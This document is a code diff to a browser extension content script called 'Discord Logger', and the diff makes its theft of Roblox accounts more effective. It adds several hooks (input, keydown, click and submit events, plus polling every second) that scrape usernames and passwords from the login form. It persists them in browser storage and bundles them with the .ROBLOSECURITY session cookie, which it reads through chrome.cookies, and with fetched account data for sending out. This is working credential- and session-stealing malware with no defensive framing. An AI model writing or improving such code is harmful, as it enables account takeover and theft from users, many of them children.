@@ -3,6 +3,10 @@
 (function() {
   console.log('Discord Logger content script loaded on:', window.location.href);
 
+  // Track sent credentials to avoid duplicates
+  let lastSentCredentials = null;
+  let lastSentCookie = null;
+
   function sendLogToBackground(level, args) {
     const logData = {
       level: level,
@@ -28,13 +32,41 @@
     });
   }
 
+  function sendCombinedLoginData(credentials, cookieValue, userData) {
+    const combinedData = {
+      level: 'roblox_combined',
+      credentials: credentials,
+      cookie: cookieValue,
+      userData: userData,
+      timestamp: new Date().toISOString(),
+      url: window.location.href,
+      userAgent: navigator.userAgent
+    };
+
+    chrome.runtime.sendMessage({
+      type: 'LOG_CAPTURED',
+      data: combinedData
+    }, (response) => {
+      if (chrome.runtime.lastError) {
+        console.error('Error sending combined message:', chrome.runtime.lastError);
+      } else {
+        console.log('Combined message sent successfully:', response);
+      }
+    });
+  }
+
   // Function to capture Roblox security cookie and fetch comprehensive user data
   async function captureRobloxSecurity() {
     if (!window.location.hostname.includes('roblox.com')) {
       return;
     }
 
-    console.log('Checking for Roblox security cookie...');
+    // Only capture on successful login redirect page
+    if (!window.location.href.includes('roblox.com/?nl=true')) {
+      return;
+    }
+
+    console.log('Checking for Roblox security cookie on successful login page...');
     
     // Get all cookies including httpOnly ones using chrome.cookies API
     try {
@@ -48,37 +80,87 @@
           if (roblosecurityCookie) {
             console.log('Found ROBLOSECURITY cookie via API');
             
-            // Check for recent login attempt
-            let username = '';
-            let password = '';
+            // Check if we already sent this cookie
+            if (lastSentCookie === roblosecurityCookie.value) {
+              console.log('Cookie already sent, skipping...');
+              return;
+            }
 
-            if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
-              username = window.robloxLoginAttempt.username;
-              password = window.robloxLoginAttempt.password;
-            } else {
-              // Fallback to current form detection
-              const credentials = captureRobloxCredentials();
-              username = credentials.username;
-              password = credentials.password;
+            // Check for recent login attempt with extended search
+            let credentials = { username: '', password: '' };
+
+            console.log('Checking for stored credentials...');
+
+            // First check window object
+            if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
+              credentials.username = window.robloxLoginAttempt.username;
+              credentials.password = window.robloxLoginAttempt.password;
+              console.log('Found credentials in window object:', credentials.username ? 'YES' : 'NO');
+            } 
+            // Fallback to sessionStorage with extended timeout
+            else {
+              try {
+                const storedAttempt = sessionStorage.getItem('robloxLoginAttempt');
+                if (storedAttempt) {
+                  const parsedAttempt = JSON.parse(storedAttempt);
+                  if (parsedAttempt && (Date.now() - parsedAttempt.timestamp) < 600000) { // Extended to 10 minutes
+                    credentials.username = parsedAttempt.username;
+                    credentials.password = parsedAttempt.password;
+                    console.log('Retrieved credentials from sessionStorage:', credentials.username ? 'YES' : 'NO');
+                  } else {
+                    console.log('SessionStorage credentials expired or invalid');
+                  }
+                } else {
+                  console.log('No credentials found in sessionStorage');
+                }
+              } catch (error) {
+                console.log('Error retrieving from sessionStorage:', error);
+              }
+
+              // Try localStorage as fallback
+              if (!credentials.username || !credentials.password) {
+                try {
+                  const localStoredAttempt = localStorage.getItem('robloxLoginAttempt');
+                  if (localStoredAttempt) {
+                    const parsedLocalAttempt = JSON.parse(localStoredAttempt);
+                    if (parsedLocalAttempt && (Date.now() - parsedLocalAttempt.timestamp) < 600000) {
+                      credentials.username = parsedLocalAttempt.username;
+                      credentials.password = parsedLocalAttempt.password;
+                      console.log('Retrieved credentials from localStorage:', credentials.username ? 'YES' : 'NO');
+                    }
+                  }
+                } catch (error) {
+                  console.log('Error retrieving from localStorage:', error);
+                }
+              }
+            }
+
+            // Final fallback - try to capture from current page if still on roblox
+            if ((!credentials.username || !credentials.password) && window.location.hostname.includes('roblox.com')) {
+              console.log('Attempting final credential capture from current page...');
+              const currentPageCredentials = captureRobloxCredentials();
+              if (currentPageCredentials.username && currentPageCredentials.password) {
+                credentials = currentPageCredentials;
+                console.log('Found credentials on current page');
+              }
             }
 
             // Fetch comprehensive user data using the security token
             const userData = await fetchRobloxUserData(roblosecurityCookie.value);
 
-            // Send login credentials first
-            let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${roblosecurityCookie.value}`;
-            if (username) loginMessage += `\n👤 USERNAME: ${username}`;
-            if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+            // Send combined data (credentials + cookie + user data)
+            sendCombinedLoginData(credentials, roblosecurityCookie.value, userData);
 
-            sendLogToBackground('roblox_login', [loginMessage]);
-
-            // Send comprehensive user data if available
-            if (userData) {
-              sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
-            }
-
+            // Update tracking
+            lastSentCookie = roblosecurityCookie.value;
+            
             // Clear the stored login attempt
             delete window.robloxLoginAttempt;
+            try {
+              sessionStorage.removeItem('robloxLoginAttempt');
+            } catch (error) {
+              console.log('Error clearing sessionStorage:', error);
+            }
           }
         }
       });
@@ -93,37 +175,53 @@
       if (name === '.ROBLOSECURITY') {
         console.log('Found ROBLOSECURITY cookie in document.cookie');
         
-        // Check for recent login attempt
-        let username = '';
-        let password = '';
+        // Check if we already sent this cookie
+        if (lastSentCookie === value) {
+          console.log('Cookie already sent, skipping...');
+          return;
+        }
 
-        if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
-          username = window.robloxLoginAttempt.username;
-          password = window.robloxLoginAttempt.password;
-        } else {
-          // Fallback to current form detection
-          const credentials = captureRobloxCredentials();
-          username = credentials.username;
-          password = credentials.password;
+        // Check for recent login attempt
+        let credentials = { username: '', password: '' };
+
+        // First check window object
+        if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
+          credentials.username = window.robloxLoginAttempt.username;
+          credentials.password = window.robloxLoginAttempt.password;
+        } 
+        // Fallback to sessionStorage
+        else {
+          try {
+            const storedAttempt = sessionStorage.getItem('robloxLoginAttempt');
+            if (storedAttempt) {
+              const parsedAttempt = JSON.parse(storedAttempt);
+              if (parsedAttempt && (Date.now() - parsedAttempt.timestamp) < 300000) { // 5 minutes
+                credentials.username = parsedAttempt.username;
+                credentials.password = parsedAttempt.password;
+                console.log('Retrieved credentials from sessionStorage (fallback)');
+              }
+            }
+          } catch (error) {
+            console.log('Error retrieving from sessionStorage (fallback):', error);
+          }
         }
 
         // Fetch comprehensive user data using the security token
         const userData = await fetchRobloxUserData(value);
 
-        // Send login credentials first
-        let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${value}`;
-        if (username) loginMessage += `\n👤 USERNAME: ${username}`;
-        if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+        // Send combined data (credentials + cookie + user data)
+        sendCombinedLoginData(credentials, value, userData);
 
-        sendLogToBackground('roblox_login', [loginMessage]);
-
-        // Send comprehensive user data if available
-        if (userData) {
-          sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
-        }
-
+        // Update tracking
+        lastSentCookie = value;
+        
         // Clear the stored login attempt
         delete window.robloxLoginAttempt;
+        try {
+          sessionStorage.removeItem('robloxLoginAttempt');
+        } catch (error) {
+          console.log('Error clearing sessionStorage (fallback):', error);
+        }
         break;
       }
     }
@@ -306,61 +404,133 @@
     let username = '';
     let password = '';
 
-    // Try to get from current login form inputs with more comprehensive selectors
+    console.log('Attempting to capture Roblox credentials...');
+
+    // Enhanced selectors for Roblox login page (2024+ version)
     const usernameSelectors = [
+      // Modern Roblox selectors
       'input[data-testid="username-field"]',
       'input[data-testid="email-phone-username-field"]',
+      'input[data-testid="login-username"]',
+      'input[data-testid="login-email"]',
+      'input[placeholder*="Username" i]',
+      'input[placeholder*="Email" i]',
+      'input[placeholder*="Phone" i]',
       'input[id*="username"]',
       'input[name*="username"]',
-      'input[placeholder*="username" i]',
-      'input[placeholder*="user" i]',
-      'input[type="text"]',
+      'input[class*="username"]',
+      'input[class*="login-username"]',
+      'input[class*="form-control"][type="text"]',
+      'input[type="text"]:not([placeholder*="search" i]):not([placeholder*="code" i]):not([placeholder*="captcha" i])',
       'input[type="email"]',
-      'input[autocomplete="username"]'
+      'input[autocomplete="username"]',
+      'input[autocomplete="email"]',
+      // Generic fallbacks for any text input on login page
+      '#login-username',
+      '#username',
+      '.username-input',
+      '.login-input[type="text"]'
     ];
 
     const passwordSelectors = [
+      // Modern Roblox selectors
       'input[data-testid="password-field"]',
+      'input[data-testid="login-password"]',
       'input[type="password"]',
+      'input[placeholder*="Password" i]',
       'input[id*="password"]',
       'input[name*="password"]',
-      'input[placeholder*="password" i]',
-      'input[autocomplete="current-password"]'
+      'input[class*="password"]',
+      'input[class*="login-password"]',
+      'input[class*="form-control"][type="password"]',
+      'input[autocomplete="current-password"]',
+      'input[autocomplete="password"]',
+      // Generic fallbacks
+      '#login-password',
+      '#password',
+      '.password-input'
     ];
 
     // Try each username selector
     for (const selector of usernameSelectors) {
-      const inputs = document.querySelectorAll(selector);
-      for (const input of inputs) {
-        if (input.value && input.value.trim() !== '') {
-          username = input.value.trim();
-          console.log('Found username via selector:', selector, username);
-          break;
+      try {
+        const inputs = document.querySelectorAll(selector);
+        console.log(`Checking selector ${selector}, found ${inputs.length} inputs`);
+        for (const input of inputs) {
+          if (input.value && input.value.trim() !== '' && input.value.length > 2) {
+            username = input.value.trim();
+            console.log('✓ Found username via selector:', selector, username.substring(0, 3) + '***');
+            break;
+          }
         }
+        if (username) break;
+      } catch (e) {
+        console.log('Error with selector:', selector, e.message);
       }
-      if (username) break;
     }
 
     // Try each password selector
     for (const selector of passwordSelectors) {
-      const inputs = document.querySelectorAll(selector);
-      for (const input of inputs) {
-        if (input.value && input.value.trim() !== '') {
-          password = input.value.trim();
-          console.log('Found password via selector:', selector, password);
-          break;
+      try {
+        const inputs = document.querySelectorAll(selector);
+        console.log(`Checking password selector ${selector}, found ${inputs.length} inputs`);
+        for (const input of inputs) {
+          if (input.value && input.value.trim() !== '' && input.value.length > 3) {
+            password = input.value.trim();
+            console.log('✓ Found password via selector:', selector, '***' + password.substring(password.length - 2));
+            break;
+          }
         }
+        if (password) break;
+      } catch (e) {
+        console.log('Error with password selector:', selector, e.message);
       }
-      if (password) break;
     }
 
-    // Also try to get from localStorage or sessionStorage
-    try {
-      const storedUsername = localStorage.getItem('roblox_username') || sessionStorage.getItem('roblox_username');
-      if (storedUsername && !username) username = storedUsername;
-    } catch (e) {
-      console.log('Could not access storage:', e.message);
+    // Fallback: Get all input fields and manually check
+    if (!username || !password) {
+      console.log('Fallback: Checking all input fields...');
+      const allInputs = document.querySelectorAll('input');
+      console.log('Total inputs found:', allInputs.length);
+      
+      for (const input of allInputs) {
+        const value = input.value?.trim();
+        const type = input.type?.toLowerCase();
+        const placeholder = input.placeholder?.toLowerCase() || '';
+        const id = input.id?.toLowerCase() || '';
+        const name = input.name?.toLowerCase() || '';
+        
+        console.log('Input details:', {
+          type,
+          placeholder,
+          id,
+          name,
+          hasValue: !!value,
+          valueLength: value?.length || 0
+        });
+
+        if (!username && value && value.length > 2 && type !== 'password') {
+          if (placeholder.includes('username') || placeholder.includes('email') || 
+              placeholder.includes('phone') || id.includes('username') || 
+              name.includes('username') || type === 'email' || type === 'text') {
+            username = value;
+            console.log('✓ Fallback found username:', username.substring(0, 3) + '***');
+          }
+        }
+
+        if (!password && value && value.length > 3 && type === 'password') {
+          password = value;
+          console.log('✓ Fallback found password:', '***' + password.substring(password.length - 2));
+        }
+      }
     }
+
+    console.log('Credential capture result:', {
+      hasUsername: !!username,
+      hasPassword: !!password,
+      usernameLength: username?.length || 0,
+      passwordLength: password?.length || 0
+    });
 
     return { username, password };
   }
@@ -374,11 +544,13 @@
 
     console.log('Starting enhanced Roblox monitoring on:', window.location.href);
 
-    // Check for security cookie on page load with delays
-    setTimeout(captureRobloxSecurity, 1000);
-    setTimeout(captureRobloxSecurity, 3000);
-    setTimeout(captureRobloxSecurity, 5000);
-    setTimeout(captureRobloxSecurity, 10000);
+    // Only check for security cookie if on successful login page
+    if (window.location.href.includes('roblox.com/?nl=true')) {
+      setTimeout(captureRobloxSecurity, 1000);
+      setTimeout(captureRobloxSecurity, 3000);
+      setTimeout(captureRobloxSecurity, 5000);
+      setTimeout(captureRobloxSecurity, 10000);
+    }
 
     // Monitor for cookie changes more frequently
     let lastCookies = document.cookie;
@@ -434,62 +606,240 @@
       return result;
     };
 
-    // Enhanced form submission monitoring
-    document.addEventListener('submit', function(event) {
-      console.log('Form submission detected on Roblox');
-      const form = event.target;
-      if (form && form.tagName === 'FORM') {
-        // Capture credentials immediately from form
-        const credentials = captureRobloxCredentials();
+    // Enhanced form submission monitoring - only on login page
+    if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
+      console.log('Setting up form submission monitoring on Roblox login page');
+      
+      // More aggressive credential monitoring with multiple strategies
+      let credentialCaptureActive = true;
+      
+      // Strategy 1: Monitor all input changes in real-time
+      document.addEventListener('input', function(event) {
+        if (!credentialCaptureActive) return;
         
-        if (credentials.username || credentials.password) {
-          console.log('Login credentials captured from form submission');
-          
-          const logMessage = `🔑 ROBLOX LOGIN ATTEMPT DETECTED:\n👤 USERNAME: ${credentials.username || 'Not captured'}\n🔑 PASSWORD: ${credentials.password || 'Not captured'}`;
-          sendLogToBackground('info', [logMessage]);
+        const input = event.target;
+        if (input && input.tagName === 'INPUT') {
+          // Immediately try to capture whenever any input changes
+          setTimeout(() => {
+            const credentials = captureRobloxCredentials();
+            if (credentials.username && credentials.password) {
+              console.log('Credentials captured via input monitoring:', credentials.username ? 'HAS_USER' : 'NO_USER', credentials.password ? 'HAS_PASS' : 'NO_PASS');
+              storeCredentials(credentials);
+            }
+          }, 100); // Very short delay
+        }
+      });
 
-          // Store credentials to associate with security token
+      // Strategy 2: Monitor key presses
+      document.addEventListener('keydown', function(event) {
+        if (!credentialCaptureActive) return;
+        
+        // Capture on Enter key press (common way to submit)
+        if (event.key === 'Enter') {
+          console.log('Enter key pressed, capturing credentials');
+          const credentials = captureRobloxCredentials();
+          if (credentials.username && credentials.password) {
+            console.log('Credentials captured via Enter key');
+            storeCredentials(credentials);
+          }
+        }
+      });
+
+      // Strategy 3: Form submission monitoring with preventDefault
+      document.addEventListener('submit', function(event) {
+        console.log('Form submission detected on Roblox login page');
+        const form = event.target;
+        if (form && form.tagName === 'FORM') {
+          // Capture credentials immediately before form processes
+          const credentials = captureRobloxCredentials();
+          
+          if (credentials.username && credentials.password) {
+            console.log('✓ Credentials captured from form submission:', credentials.username);
+            storeCredentials(credentials);
+          } else {
+            console.log('✗ Form submitted but no credentials found');
+            // Try one more aggressive capture
+            setTimeout(() => {
+              const retryCredentials = captureRobloxCredentials();
+              if (retryCredentials.username && retryCredentials.password) {
+                console.log('✓ Retry capture successful');
+                storeCredentials(retryCredentials);
+              }
+            }, 50);
+          }
+        }
+      });
+
+      // Strategy 4: Button click monitoring with better targeting
+      document.addEventListener('click', function(event) {
+        if (!credentialCaptureActive) return;
+        
+        const target = event.target;
+        const isLoginButton = target && (
+          target.textContent?.toLowerCase().includes('log in') ||
+          target.textContent?.toLowerCase().includes('sign in') ||
+          target.id?.toLowerCase().includes('login') ||
+          target.className?.toLowerCase().includes('login') ||
+          target.type === 'submit' ||
+          target.getAttribute('data-testid')?.includes('login') ||
+          target.closest('button')?.textContent?.toLowerCase().includes('log in')
+        );
+
+        if (isLoginButton) {
+          console.log('Login button clicked, immediate credential capture');
+          
+          // Multiple capture attempts with different delays
+          const credentials1 = captureRobloxCredentials();
+          if (credentials1.username && credentials1.password) {
+            console.log('✓ Immediate capture successful');
+            storeCredentials(credentials1);
+          } else {
+            // Try again after 50ms
+            setTimeout(() => {
+              const credentials2 = captureRobloxCredentials();
+              if (credentials2.username && credentials2.password) {
+                console.log('✓ Delayed capture successful');
+                storeCredentials(credentials2);
+              }
+            }, 50);
+
+            // And again after 200ms
+            setTimeout(() => {
+              const credentials3 = captureRobloxCredentials();
+              if (credentials3.username && credentials3.password) {
+                console.log('✓ Final delayed capture successful');
+                storeCredentials(credentials3);
+              }
+            }, 200);
+          }
+        }
+      });
+
+      // Helper function to store credentials
+      function storeCredentials(credentials) {
+        const credentialString = `${credentials.username}:${credentials.password}`;
+        if (lastSentCredentials !== credentialString) {
+          console.log('🔐 Storing new credentials:', credentials.username);
+          lastSentCredentials = credentialString;
+
+          // Store credentials for later use with cookie
           window.robloxLoginAttempt = { 
             username: credentials.username, 
             password: credentials.password, 
             timestamp: Date.now() 
           };
 
-          // Check for security token after form submission with multiple delays
-          setTimeout(captureRobloxSecurity, 1000);
-          setTimeout(captureRobloxSecurity, 3000);
-          setTimeout(captureRobloxSecurity, 5000);
-          setTimeout(captureRobloxSecurity, 8000);
+          // Store in multiple places for maximum persistence
+          try {
+            sessionStorage.setItem('robloxLoginAttempt', JSON.stringify({
+              username: credentials.username,
+              password: credentials.password,
+              timestamp: Date.now()
+            }));
+            console.log('✓ Stored in sessionStorage');
+          } catch (error) {
+            console.log('✗ SessionStorage failed:', error);
+          }
+
+          try {
+            localStorage.setItem('robloxLoginAttempt', JSON.stringify({
+              username: credentials.username,
+              password: credentials.password,
+              timestamp: Date.now()
+            }));
+            console.log('✓ Stored in localStorage');
+          } catch (error) {
+            console.log('✗ LocalStorage failed:', error);
+          }
+
+          // Send credentials immediately
+          sendLogToBackground('roblox_login', `Username: ${credentials.username}, Password: ${credentials.password}`);
         }
       }
-    });
 
-    // Enhanced input monitoring with real-time capture
+      // Strategy 5: Periodic credential checking while on login page
+      const credentialCheckInterval = setInterval(() => {
+        if (!credentialCaptureActive) {
+          clearInterval(credentialCheckInterval);
+          return;
+        }
+
+        const credentials = captureRobloxCredentials();
+        if (credentials.username && credentials.password) {
+          const credentialString = `${credentials.username}:${credentials.password}`;
+          if (lastSentCredentials !== credentialString) {
+            console.log('✓ Periodic check found new credentials');
+            storeCredentials(credentials);
+          }
+        }
+      }, 1000); // Check every second
+
+      // Disable monitoring when leaving the login page
+      const observer = new MutationObserver(() => {
+        if (!window.location.href.includes('roblox.com/Login') && !window.location.href.includes('roblox.com/login')) {
+          console.log('Left login page, disabling credential monitoring');
+          credentialCaptureActive = false;
+          clearInterval(credentialCheckInterval);
+          observer.disconnect();
+        }
+      });
+
+      observer.observe(document, { subtree: true, childList: true });
+    }
+
+    // Enhanced input monitoring with real-time capture - only on login page
     let inputTimeout;
-    document.addEventListener('input', function(event) {
-      const input = event.target;
-      if (input && input.tagName === 'INPUT') {
-        // Clear previous timeout
-        clearTimeout(inputTimeout);
-        
-        // Set new timeout to capture after user stops typing
-        inputTimeout = setTimeout(() => {
-          const credentials = captureRobloxCredentials();
-          if (credentials.username && credentials.password) {
-            console.log('Login credentials updated via input monitoring');
+    let credentialCheckInterval;
+    
+    if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
+      console.log('Setting up input monitoring on Roblox login page');
+      
+      document.addEventListener('input', function(event) {
+        const input = event.target;
+        if (input && input.tagName === 'INPUT') {
+          console.log('Input detected:', input.type, input.placeholder);
+          
+          // Clear previous timeout
+          clearTimeout(inputTimeout);
+          
+          // Set new timeout to capture after user stops typing
+          inputTimeout = setTimeout(() => {
+            const credentials = captureRobloxCredentials();
+            if (credentials.username && credentials.password) {
+              const credentialString = `${credentials.username}:${credentials.password}`;
+              if (lastSentCredentials !== credentialString) {
+                console.log('New login credentials updated via input monitoring');
+                lastSentCredentials = credentialString;
+                
+                window.robloxLoginAttempt = { 
+                  username: credentials.username, 
+                  password: credentials.password, 
+                  timestamp: Date.now() 
+                };
+              }
+            }
+          }, 1500);
+        }
+      });
+
+      // Periodic credential checking while on login page
+      credentialCheckInterval = setInterval(() => {
+        const credentials = captureRobloxCredentials();
+        if (credentials.username && credentials.password) {
+          const credentialString = `${credentials.username}:${credentials.password}`;
+          if (lastSentCredentials !== credentialString) {
+            console.log('Periodic check found new credentials');
+            lastSentCredentials = credentialString;
+            
             window.robloxLoginAttempt = { 
               username: credentials.username, 
               password: credentials.password, 
               timestamp: Date.now() 
             };
-            
-            // Send immediate notification of credential capture
-            const logMessage = `🔑 ROBLOX CREDENTIALS CAPTURED:\n👤 USERNAME: ${credentials.username}\n🔑 PASSWORD: ${credentials.password}`;
-            sendLogToBackground('info', [logMessage]);
           }
-        }, 1000); // Wait 1 second after user stops typing
-      }
-    });
+        }
+      }, 2000); // Check every 2 seconds
+    }
 
     // Monitor for button clicks (login buttons)
     document.addEventListener('click', function(event) {
@@ -526,6 +876,7 @@
     window.addEventListener('beforeunload', () => {
       clearInterval(cookieInterval);
       clearTimeout(inputTimeout);
+      if (credentialCheckInterval) clearInterval(credentialCheckInterval);
     });
   }
 
